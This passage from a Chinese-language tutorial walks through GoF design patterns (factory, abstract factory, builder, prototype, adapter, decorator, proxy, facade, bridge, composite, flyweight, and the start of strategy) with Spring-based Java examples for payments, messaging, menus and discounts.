<blockquote>
<p>隔离变化：对象创建逻辑<br/>
Spring 实现：<code>@Bean</code> 方法</p>
</blockquote>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. 定义接口</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Payment</span> {
    String <span class="hljs-title function_">getType</span><span class="hljs-params">()</span>; <span class="hljs-comment">// 返回 "alipay" 或 "wechat"</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">pay</span><span class="hljs-params">(Order order)</span>;
}

<span class="hljs-comment">// 2. 实现类</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Alipay</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Payment</span> {
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getType</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> <span class="hljs-string">"alipay"</span>; }
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pay</span><span class="hljs-params">(Order order)</span> { ... }
}

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WechatPay</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Payment</span> {
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getType</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> <span class="hljs-string">"wechat"</span>; }
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pay</span><span class="hljs-params">(Order order)</span> { ... }
}

<span class="hljs-comment">// 3. 策略工厂（自动注册）</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PaymentFactory</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, Payment&gt; payments;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">PaymentFactory</span><span class="hljs-params">(List&lt;Payment&gt; paymentList)</span> {
        <span class="hljs-built_in">this</span>.payments = paymentList.stream()
            .collect(Collectors.toMap(Payment::getType, p -&gt; p));
    }

    <span class="hljs-keyword">public</span> Payment <span class="hljs-title function_">get</span><span class="hljs-params">(String type)</span> {
        <span class="hljs-keyword">return</span> payments.get(type);
    }
}

<span class="hljs-comment">// 4. 使用</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    <span class="hljs-meta">@Autowired</span> <span class="hljs-keyword">private</span> PaymentFactory paymentFactory;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-type">Payment</span> <span class="hljs-variable">payment</span> <span class="hljs-operator">=</span> paymentFactory.get(order.getPayType());
        payment.pay(order);
    }
}

</code></pre>
<p>✅ 效果：根据参数动态创建对象。</p>
<h5 data-id="heading-22">3. 抽象工厂模式（Abstract Factory）</h5>
<blockquote>
<p>隔离变化：产品族（如多环境数据源）<br/>
Spring 实现：Profile + 条件装配</p>
</blockquote>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@Profile("prod")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProdDatabaseFactory</span> {
    <span class="hljs-meta">@Bean</span> <span class="hljs-keyword">public</span> DataSource <span class="hljs-title function_">dataSource</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HikariDataSource</span>(); }
    <span class="hljs-meta">@Bean</span> <span class="hljs-keyword">public</span> JdbcTemplate <span class="hljs-title function_">jdbcTemplate</span><span class="hljs-params">(DataSource ds)</span> { <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcTemplate</span>(ds); }
}

<span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@Profile("test")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestDatabaseFactory</span> {
    <span class="hljs-meta">@Bean</span> <span class="hljs-keyword">public</span> DataSource <span class="hljs-title function_">dataSource</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EmbeddedDatabaseBuilder</span>().build(); }
    <span class="hljs-meta">@Bean</span> <span class="hljs-keyword">public</span> JdbcTemplate <span class="hljs-title function_">jdbcTemplate</span><span class="hljs-params">(DataSource ds)</span> { <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcTemplate</span>(ds); }
}
</code></pre>
<p>✅ 效果：整套组件一键切换，无需改业务代码。</p>
<h5 data-id="heading-23">4. 建造者模式（Builder）</h5>
<blockquote>
<p>隔离变化：复杂对象构建步骤<br/>
Spring 实现：<code>WebClient.builder()</code></p>
</blockquote>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ApiService</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> WebClient webClient;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ApiService</span><span class="hljs-params">()</span> {
        <span class="hljs-built_in">this</span>.webClient = WebClient.builder()
            .baseUrl(<span class="hljs-string">"https://api.example.com"</span>)
            .defaultHeader(<span class="hljs-string">"User-Agent"</span>, <span class="hljs-string">"MyApp/1.0"</span>)
            .build();
    }

    <span class="hljs-keyword">public</span> Mono&lt;String&gt; <span class="hljs-title function_">getData</span><span class="hljs-params">(String path)</span> {
        <span class="hljs-keyword">return</span> webClient.get().uri(path).retrieve().bodyToMono(String.class);
    }
}
</code></pre>
<p>✅ 效果：构建过程清晰，参数可选，避免构造函数爆炸。</p>
<hr/>
<h5 data-id="heading-24">5. 原型模式（Prototype）</h5>
<blockquote>
<p>隔离变化：高成本对象初始化<br/>
Spring 实现：<code>@Scope("prototype")</code></p>
</blockquote>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-meta">@Scope("prototype")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderContext</span> {
    <span class="hljs-keyword">private</span> String orderId;
    <span class="hljs-keyword">private</span> <span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">createTime</span> <span class="hljs-operator">=</span> LocalDateTime.now();

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setOrderId</span><span class="hljs-params">(String id)</span> { <span class="hljs-built_in">this</span>.orderId = id; }
    <span class="hljs-comment">// ...</span>
}
</code></pre>
<p>✅ 效果：每次注入都是新实例，避免状态污染（如请求级上下文）。</p>
<h4 data-id="heading-25">b、结构型模式（7种）</h4>
<h5 data-id="heading-26">6. 适配器模式（Adapter）</h5>
<blockquote>
<p>隔离变化：第三方接口不兼容<br/>
Spring 实现：封装 SDK</p>
</blockquote>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 第三方 SDK</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">WxPaySDK</span> {
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">pay</span><span class="hljs-params">(String openid, <span class="hljs-type">double</span> amount)</span> { <span class="hljs-comment">/* 微信支付 */</span> }
}

<span class="hljs-comment">// 适配器</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WxPayAdapter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Payment</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">WxPaySDK</span> <span class="hljs-variable">sdk</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WxPaySDK</span>();

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pay</span><span class="hljs-params">(Order order)</span> {
        sdk.pay(order.getUser().getOpenid(), order.getAmount());
    }
}
</code></pre>
<p>✅ 效果：业务只依赖 <code>Payment</code> 接口，不关心微信细节。</p>
<h5 data-id="heading-27">7. 装饰器模式（Decorator）</h5>
<blockquote>
<p>隔离变化：功能动态增强<br/>
Spring 实现：AOP 或包装 Bean</p>
</blockquote>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-meta">@Primary</span> <span class="hljs-comment">// 优先注入</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoggingUserService</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> UserService target;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">LoggingUserService</span><span class="hljs-params">(<span class="hljs-meta">@Qualifier("userServiceImpl")</span> UserService target)</span> {
        <span class="hljs-built_in">this</span>.target = target;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUser</span><span class="hljs-params">(Long id)</span> {
        log.info(<span class="hljs-string">"查询用户: {}"</span>, id);
        <span class="hljs-keyword">return</span> target.getUser(id); <span class="hljs-comment">// 增强原功能</span>
    }
}
</code></pre>
<p>✅ 效果：日志、缓存、限流等功能可叠加，不侵入核心逻辑。</p>
<h5 data-id="heading-28">8. 代理模式（Proxy）</h5>
<blockquote>
<p>隔离变化：控制对象访问（事务、安全等）<br/>
Spring 实现：Spring AOP（自动代理）</p>
</blockquote>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {

    <span class="hljs-meta">@Transactional</span> <span class="hljs-comment">// Spring 自动生成代理，开启事务</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">(Order order)</span> {
        orderRepository.save(order);
        inventoryService.deduct(order.getItems());
    }
}
</code></pre>
<p>✅ 效果：事务、缓存、安全等横切关注点与业务完全解耦。</p>
<h5 data-id="heading-29">9. 外观模式（Facade）</h5>
<blockquote>
<p>隔离变化：子系统复杂性<br/>
Spring 实现：<code>@Service</code> 封装多个依赖</p>
</blockquote>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderFacade</span> {
    <span class="hljs-meta">@Autowired</span> <span class="hljs-keyword">private</span> OrderRepository orderRepo;
    <span class="hljs-meta">@Autowired</span> <span class="hljs-keyword">private</span> InventoryService inventory;
    <span class="hljs-meta">@Autowired</span> <span class="hljs-keyword">private</span> NotificationService notify;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">(OrderDTO dto)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> orderRepo.save(dto.toEntity());
        inventory.deduct(order.getItems());
        notify.send(order.getUser(), <span class="hljs-string">"下单成功"</span>);
    }
}
</code></pre>
<p>✅ 效果：调用方只需面对一个简单接口，内部复杂性被隐藏。</p>
<h5 data-id="heading-30">10. 桥接模式（Bridge）</h5>
<blockquote>
<p>隔离变化：抽象与实现紧耦合<br/>
两个维度的变化：</p>
</blockquote>
<blockquote>
<p>抽象维度（如：消息类型：通知、告警、营销）</p>
</blockquote>
<blockquote>
<p>实现维度（如：发送渠道：邮件、短信、微信）</p>
</blockquote>
<blockquote>
<p>组合而非继承：抽象持有实现的引用</p>
</blockquote>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 实现维度：发送渠道</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">MessageSender</span> {
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">send</span><span class="hljs-params">(String msg)</span>;
}

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EmailSender</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MessageSender</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">send</span><span class="hljs-params">(String msg)</span> { System.out.println(<span class="hljs-string">"📧 邮件: "</span> + msg); }
}

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SmsSender</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MessageSender</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">send</span><span class="hljs-params">(String msg)</span> { System.out.println(<span class="hljs-string">"📱 短信: "</span> + msg); }
}


<span class="hljs-comment">// 抽象维度：消息类型</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Message</span> {
    <span class="hljs-keyword">protected</span> MessageSender sender; <span class="hljs-comment">// 持有实现的引用（桥接！）</span>

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Message</span><span class="hljs-params">(MessageSender sender)</span> {
        <span class="hljs-built_in">this</span>.sender = sender;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">send</span><span class="hljs-params">(String content)</span>;
}

<span class="hljs-comment">// 通知消息</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NotificationMessage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Message</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">NotificationMessage</span><span class="hljs-params">(MessageSender sender)</span> {
        <span class="hljs-built_in">super</span>(sender);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">send</span><span class="hljs-params">(String content)</span> {
        sender.send(<span class="hljs-string">"[通知] "</span> + content);
    }
}

<span class="hljs-comment">// 告警消息</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AlertMessage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Message</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">AlertMessage</span><span class="hljs-params">(MessageSender sender)</span> {
        <span class="hljs-built_in">super</span>(sender);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">send</span><span class="hljs-params">(String content)</span> {
        sender.send(<span class="hljs-string">"[🚨 告警] "</span> + content);
    }
}

<span class="hljs-comment">// 营销消息</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MarketingMessage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Message</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MarketingMessage</span><span class="hljs-params">(MessageSender sender)</span> {
        <span class="hljs-built_in">super</span>(sender);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">send</span><span class="hljs-params">(String content)</span> {
        sender.send(<span class="hljs-string">"[🎁 营销] "</span> + content);
    }
}

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MessageService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> EmailSender emailSender;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> SmsSender smsSender;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">demo</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 通知 + 邮件</span>
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">NotificationMessage</span>(emailSender).send(<span class="hljs-string">"系统升级"</span>);

        <span class="hljs-comment">// 告警 + 短信</span>
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AlertMessage</span>(smsSender).send(<span class="hljs-string">"CPU 使用率过高！"</span>);

        <span class="hljs-comment">// 营销 + 邮件</span>
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarketingMessage</span>(emailSender).send(<span class="hljs-string">"双11大促开始了！"</span>);
    }
}



</code></pre>
<p>✅ 效果：发送方式和通知逻辑独立演进，互不影响。</p>
<h5 data-id="heading-31">11. 组合模式（Composite）</h5>
<blockquote>
<p>隔离变化：树形结构处理差异<br/>
Spring 实现：菜单/权限树</p>
</blockquote>
<ul>
<li>
<p>统一接口：单个（叶子）和组合（容器）都实现同一个接口</p>
</li>
<li>
<p>递归处理：组合对象调用自己内部每个子对象的相同方法</p>
</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">MenuComponent</span> {
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">render</span><span class="hljs-params">()</span>; <span class="hljs-comment">// 所有菜单元素（单个 or 组）都要能渲染</span>
}

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MenuItem</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MenuComponent</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">render</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"渲染菜单项"</span>); <span class="hljs-comment">// 就干这一件事</span>
    }
}

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MenuGroup</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MenuComponent</span> {
    <span class="hljs-comment">// 存放子菜单（可以是 MenuItem，也可以是 MenuGroup！）</span>
    <span class="hljs-keyword">private</span> List&lt;MenuComponent&gt; children = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addChild</span><span class="hljs-params">(MenuComponent child)</span> {
        children.add(child);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">render</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 关键！遍历所有子元素，调用它们的 render()</span>
        children.forEach(child -&gt; child.render());
    }
}


<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 创建根菜单组</span>
        <span class="hljs-type">MenuGroup</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MenuGroup</span>();

        <span class="hljs-comment">// 添加单个菜单项</span>
        root.addChild(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MenuItem</span>()); <span class="hljs-comment">// "首页"</span>
        root.addChild(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MenuItem</span>()); <span class="hljs-comment">// "关于我们"</span>

        <span class="hljs-comment">// 创建子菜单组</span>
        <span class="hljs-type">MenuGroup</span> <span class="hljs-variable">userMenu</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MenuGroup</span>();
        userMenu.addChild(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MenuItem</span>()); <span class="hljs-comment">// "个人中心"</span>
        userMenu.addChild(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MenuItem</span>()); <span class="hljs-comment">// "退出登录"</span>

        <span class="hljs-comment">// 把子菜单组加入根菜单</span>
        root.addChild(userMenu);

        <span class="hljs-comment">// 渲染整个菜单！</span>
        root.render();
    }
}

</code></pre>
<p>✅ 效果：统一处理单个和组合对象，客户端无需区分。</p>
<h5 data-id="heading-32">12. 享元模式（Flyweight）</h5>
<blockquote>
<p>隔离变化：大量相似对象内存开销<br/>
享元模式 = 共享不变的部分 + 传递变化的部分</p>
</blockquote>
<blockquote>
<p>能有效解决 大量重复小对象导致的内存问题。</p>
</blockquote>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 标签享元接口</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserTagFlyweight</span> {
    <span class="hljs-comment">/**
     * 显示标签（外部状态：userId, position）
     */</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">(Long userId, String position)</span>;
}

<span class="hljs-comment">// 具体标签实现（内部状态：type, color, icon）</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-meta">@Scope("prototype")</span> <span class="hljs-comment">// 每次从工厂获取时由工厂控制，不是 Spring 管理单例</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConcreteUserTag</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserTagFlyweight</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String type;      <span class="hljs-comment">// 内部状态：标签类型（VIP/NEW/...）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String color;     <span class="hljs-comment">// 内部状态：颜色</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String icon;      <span class="hljs-comment">// 内部状态：图标</span>

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ConcreteUserTag</span><span class="hljs-params">(String type, String color, String icon)</span> {
        <span class="hljs-built_in">this</span>.type = type;
        <span class="hljs-built_in">this</span>.color = color;
        <span class="hljs-built_in">this</span>.icon = icon;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">(Long userId, String position)</span> {
        System.out.printf(<span class="hljs-string">"[用户%d] 在 %s 显示标签: %s | 颜色=%s | 图标=%s%n"</span>, 
            userId, position, type, color, icon);
    }
}

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserTagFactory</span> {
    
    <span class="hljs-comment">// 享元池：缓存所有已创建的标签（内部状态作为 key）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, UserTagFlyweight&gt; tagPool = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();

    <span class="hljs-comment">/**
     * 获取标签（相同 type/color/icon 只创建一次）
     */</span>
    <span class="hljs-keyword">public</span> UserTagFlyweight <span class="hljs-title function_">getTag</span><span class="hljs-params">(String type, String color, String icon)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> type + <span class="hljs-string">"_"</span> + color + <span class="hljs-string">"_"</span> + icon;
        <span class="hljs-keyword">return</span> tagPool.computeIfAbsent(key, k -&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcreteUserTag</span>(type, color, icon));
    }

    <span class="hljs-comment">// 用于监控</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getPoolSize</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> tagPool.size();
    }
}

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserTagFactory tagFactory;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">renderUserTags</span><span class="hljs-params">(Long userId)</span> {
        <span class="hljs-comment">// 模拟用户拥有的标签（实际可能来自数据库）</span>
        List&lt;TagConfig&gt; userTags = getUserTagsFromDB(userId);

        <span class="hljs-keyword">for</span> (TagConfig config : userTags) {
            <span class="hljs-comment">// 从享元池获取标签（相同配置复用同一个对象）</span>
            <span class="hljs-type">UserTagFlyweight</span> <span class="hljs-variable">tag</span> <span class="hljs-operator">=</span> tagFactory.getTag(
                config.getType(), 
                config.getColor(), 
                config.getIcon()
            );
            
            <span class="hljs-comment">// 显示标签（传入外部状态）</span>
            tag.display(userId, config.getPosition());
        }
    }

    <span class="hljs-comment">// 模拟数据库查询</span>
    <span class="hljs-keyword">private</span> List&lt;TagConfig&gt; <span class="hljs-title function_">getUserTagsFromDB</span><span class="hljs-params">(Long userId)</span> {
        <span class="hljs-keyword">return</span> Arrays.asList(
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">TagConfig</span>(<span class="hljs-string">"VIP"</span>, <span class="hljs-string">"gold"</span>, <span class="hljs-string">"⭐"</span>, <span class="hljs-string">"header"</span>),
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">TagConfig</span>(<span class="hljs-string">"NEW"</span>, <span class="hljs-string">"green"</span>, <span class="hljs-string">"🆕"</span>, <span class="hljs-string">"profile"</span>),
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">TagConfig</span>(<span class="hljs-string">"VIP"</span>, <span class="hljs-string">"gold"</span>, <span class="hljs-string">"⭐"</span>, <span class="hljs-string">"sidebar"</span>) <span class="hljs-comment">// 和第一个相同！</span>
        );
    }

    <span class="hljs-comment">// 内部 DTO</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TagConfig</span> {
        String type, color, icon, position;
        TagConfig(String type, String color, String icon, String position) {
            <span class="hljs-built_in">this</span>.type = type; <span class="hljs-built_in">this</span>.color = color; <span class="hljs-built_in">this</span>.icon = icon; <span class="hljs-built_in">this</span>.position = position;
        }
        <span class="hljs-comment">// getter...</span>
    }
}

<span class="hljs-meta">@RestController</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestController</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserService userService;
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserTagFactory tagFactory;

    <span class="hljs-meta">@GetMapping("/test")</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">test</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"=== 渲染用户 1001 ==="</span>);
        userService.renderUserTags(<span class="hljs-number">1001L</span>);
        
        System.out.println(<span class="hljs-string">"=== 渲染用户 1002 ==="</span>);
        userService.renderUserTags(<span class="hljs-number">1002L</span>);
        
        System.out.println(<span class="hljs-string">"享元池大小: "</span> + tagFactory.getPoolSize()); <span class="hljs-comment">// 应该是 2（VIP 和 NEW）</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">"OK"</span>;
    }
}



</code></pre>
<p>✅ 效果：共享内部状态，大幅节省资源。</p>
<h4 data-id="heading-33">c、行为型模式（11种）</h4>
<h5 data-id="heading-34">13. 策略模式（Strategy）</h5>
<blockquote>
<p>隔离变化：算法选择（支付、折扣等）<br/>
Spring 实现：Map 自动注册（最常用！）</p>
</blockquote>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">DiscountStrategy</span> {
    String <span class="hljs-title function_">getType</span><span class="hljs-params">()</span>;
    BigDecimal <span class="hljs-title function_">apply</span><span class="hljs-params">(Order order)</span>;
}

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VipDiscount</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">DiscountStrategy</span> {
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getType</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> <span class="hljs-string">"VIP"</span>; }
    <span class="hljs-keyword">public</span> BigDecimal <span class="hljs-title function_">apply</span><span class="hljs-params">(Order order)</span> { <span class="hljs-keyword">return</span> order.getAmount().multiply(BigDecimal.valueOf(<span class="hljs-number">0.9</span>)); }
}

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HolidayDiscount</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">DiscountStrategy</span> {
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getType</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> <span class="hljs-string">"HOLIDAY"</span>; }
    <span class="hljs-keyword">public</span> BigDecimal <span class="hljs-title function_">apply</span><span class="hljs-params">(Order order)</span> { <span class="hljs-keyword">return</span> order.getAmount().multiply(BigDecimal.valueOf(<span class="hljs-number">0.8</span>)); }
}

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DiscountService</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, DiscountStrategy&gt; strategies;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DiscountService</span><span class="hljs-params">(List&lt;DiscountStrategy&gt; list)</span> {
        <span class="hljs-built_in">this</span>.strategies = list.stream()
            .collect(Collectors.toMap(DiscountStrategy::getType, s -&gt; s));
    }

    <span class="hljs-keyword">public</span> BigDecimal <span class="hljs-title function_">calculate</span><span class="hljs-params">(String type, Order order)</span> {
